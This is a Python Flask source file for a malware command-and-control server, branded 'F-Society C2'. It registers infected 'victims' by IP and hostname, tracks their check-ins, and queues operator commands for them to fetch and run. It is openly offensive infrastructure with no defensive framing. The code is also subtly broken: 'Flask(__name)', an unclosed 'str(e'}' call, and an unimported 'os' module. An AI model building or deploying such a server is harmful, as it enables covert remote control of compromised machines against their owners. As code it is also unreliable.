from flask import Flask, request, jsonify
from flask_cors import CORS
from datetime import datetime, timezone
import time
import threading

app = Flask(__name)
# Attention : En production, restrict 'origins' to your specific domain if possible.
CORS(app, resources={r"/*": {"origins": "*"}})

# Storage
victims = {}  # Victim info
commands = {} # Pending commands for victims: { "victim_id": {"action": "...", "data": {...} } }

@app.route('/')
def home():
    return jsonify({"status": "online", "message": "F-Society C2 Server Active"})

@app.route('/register', methods=['POST'])
def register():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'No data'}), 400

        ip = data.get('ip', 'Unknown')
        hostname = data.get('hostname', 'Unknown')
        
        if ip == "127.0.0.1 (Local/Error)":
            ip = request.remote_addr

        victim_id = f"{ip}_{hostname}"
        
        # Update victim status
        victims[victim_id] = {
            'id': victim_id,
            'ip': ip,
            'hostname': hostname,
            'last_seen': datetime.now(timezone.utc),
            'status': 'online'
        }
        
        print(f"[+] Victim registered/heartbeat: {hostname} ({ip})")
        
        # Check if there is a pending command for this victim
        if victim_id in commands:
            cmd = commands.pop(victim_id)
            return jsonify({'status': 'ok', 'id': victim_id, 'command': cmd})
        
        return jsonify({'status': 'ok', 'id': victim_id, 'command': None})
    
    except Exception as e:
        print(f"[-] Error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    """Victims call this to check for commands and update status."""
    try:
        data = request.get_json()
        victim_id = data.get('id')
        
        if not victim_id or victim_id not in victims:
            return jsonify({'status': 'error', 'message': 'Unknown victim'}), 403

        # Update last seen
        victims[victim_id]['last_seen'] = datetime.now(timezone.utc)
        victims[victim_id]['status'] = 'online'

        # Check for pending commands (Long Polling simulation - immediate response for demo)
        if victim_id in commands:
            cmd = commands.pop(victim_id)
            print(f"[+] Sending command to {victim_id}: {cmd}")
            return jsonify({'status': 'ok', 'command': cmd})
        
        # No command, tell victim to wait/sleep
        return jsonify({'status': 'ok', 'command': None})

    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e'}), 500

@app.route('/victims', methods=['GET'])
def get_victims():
    try:
        now = datetime.now(timezone.utc)
        active_victims = []
        
        for vid, info in victims.items():
            last_seen = info['last_seen']
            diff_minutes = (now - last_seen).total_seconds() / 60
            
            if diff_minutes > 5:
                info['status'] = 'offline'
            else:
                info['status'] = 'online'
            
            # Don't expose internal datetime objects
            safe_info = {
                'id': info['id'],
                'ip': info['ip'],
                'hostname': info['hostname'],
                'last_seen': info['last_seen'].strftime("%Y-%m-%d %H:%M:%S UTC"),
                'status': info['status']
            }
            active_victims.append(safe_info)
        
        return jsonify(active_victims)
    
    except Exception as e:
        print(f"[-] Get victims error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/send_command', methods=['POST'])
def send_command():
    """Admin panel uses this to send commands to victims."""
    try:
        data = request.get_json()
        victim_id = data.get('id')
        action = data.get('action')
        payload = data.get('data', {})

        if not victim_id or victim_id not in victims:
            return jsonify({'status': 'error', 'message': 'Victim not found or offline'}), 404

        # Store command to be picked up by victim
        commands[victim_id] = {
            'action': action,
            'data': payload
        }
        
        print(f"[!] Command queued for {victim_id}: {action}")
        return jsonify({'status': 'ok', 'message': 'Command queued'})

    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({
        "status": "healthy",
        "victims_count": len(victims),
        "pending_commands": len(commands)
    })

# Cleanup old victims periodically
def cleanup():
    while True:
        time.sleep(60)
        now = datetime.now(timezone.utc)
        to_delete = []
        for vid, info in victims.items():
            if (now - info['last_seen']).total_seconds() > 24 * 3600:
                to_delete.append(vid)
        for vid in to_delete:
            del victims[vid]
            print(f"[!] Removed old victim: {vid}")

threading.Thread(target=cleanup, daemon=True).start()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
